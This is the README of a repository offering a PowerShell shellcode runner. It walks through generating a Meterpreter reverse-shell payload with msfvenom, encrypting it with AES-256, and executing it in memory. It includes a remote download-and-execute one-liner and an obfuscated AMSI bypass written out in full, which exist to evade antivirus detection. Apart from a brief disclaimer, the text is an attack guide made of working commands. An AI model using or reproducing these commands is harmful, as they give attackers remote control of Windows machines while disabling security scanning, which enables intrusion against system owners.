# PowerShell Shellcode Runner with AES-256 Encryption

This repository provides a **PowerShell-based shellcode runner** that executes **AES-256 encrypted shellcode** in memory while bypassing AMSI and antivirus detection.

## 🚀 Features
- **Memory-based shellcode execution** (fileless)
- **AES-256 CBC encryption** for obfuscation
- **AMSI bypass** to evade detection
- **Base64 encoding for seamless integration**

---

## 1️⃣ Generate Shellcode (Metasploit)

Use `msfvenom` to generate a **raw shellcode payload**:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<PORT> -f raw > shellcode.bin
```

---

## 2️⃣ Encrypt the Shellcode (Python)

Use the **Python script** to encrypt the shellcode using **AES-256 CBC** and encode it in Base64.

```bash
python3 encrypt.py
```

The encrypted shellcode will be **outputted in Base64 format**, ready to be embedded in the PowerShell script.

---

## 3️⃣ Execute Shellcode in Memory (PowerShell)

Run the **PowerShell script** to:
- **Bypass AMSI** (Antimalware Scan Interface)
- **Decrypt and execute the shellcode in memory**

```powershell
powershell -ExecutionPolicy Bypass -NoProfile -File run.ps1
```

---

## 4️⃣ Remote Execution of the PowerShell Script

To **remotely download and execute** the script:

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://YOUR_SERVER_IP/run.ps1")
```

If **blocked by AV**, use an AMSI bypass:

```powershell
powershell -ExecutionPolicy Bypass -NoProfile -Command "$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344); IEX (New-Object Net.WebClient).DownloadString('http://YOUR_SERVER_IP/run.ps1')"
```

---

## 🔐 Disclaimer
This repository is intended **for educational and research purposes only**. Unauthorized use of this tool is **strictly prohibited**. The author assumes no responsibility for any misuse.

---

## 🛠️ Summary
✔ **Metasploit-generated shellcode is encrypted using AES-256**  
✔ **PowerShell decrypts and executes the shellcode in memory**  
✔ **AMSI bypass included to evade detection**  
✔ **Remote execution supported**  

